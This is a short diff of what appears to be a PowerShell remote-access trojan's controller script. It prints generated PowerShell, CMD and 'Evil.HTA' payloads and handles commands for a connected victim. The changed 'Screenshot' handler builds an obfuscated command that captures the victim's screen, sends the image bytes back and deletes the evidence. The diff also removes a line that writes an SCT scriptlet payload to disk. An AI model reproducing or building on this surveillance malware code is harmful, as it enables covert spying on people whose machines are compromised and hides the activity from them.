@@ -259,8 +259,6 @@ $SCT = @"
 </scriptlet>
 "@
 
-Out-File -InputObject $SCT -FilePath $OutputPath -Encoding default
-
 Write-Host "`n [*] PowerShell Payload: [*]`n`n$PowerShell_Payload";
 Write-Host "`n [*] CMD Payload: [*]`n`n$CMD_Payload`n";
 Write-Host "`n [*] HTA Payload: [*]`n`n"Evil.HTA"`n";
@@ -313,13 +311,13 @@ While($Client.Connected)
     
     If($Command -eq "Screenshot")
     {
-      $File = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_});
-      Write-Host "`n - Screenshot File: $File.png";
+      $File = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})+".png";
+      Write-Host "`n - Screenshot File: $File";
       Write-Host "`n [*] Please Wait ... [*]";
       $Command = "`$1=`"`$env:temp\#`";Add-Type -AssemblyName System.Windows.Forms;`$2=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$3=[System.Drawing.Graphics]::FromImage(`$2);`$3.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$2.Size);`$3.Dispose();`$2.Save(`"`$1`");If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ',';Remove-Item -Path `"`$1`" -Force}";
       $Command = Variable_Obfuscation(Character_Obfuscation($Command));
       $Command = $Command -replace "#","$File";
-      $File = "$pwd\$File.png";
+      $File = "$pwd\$File";
       $Save = $True;
     }
 
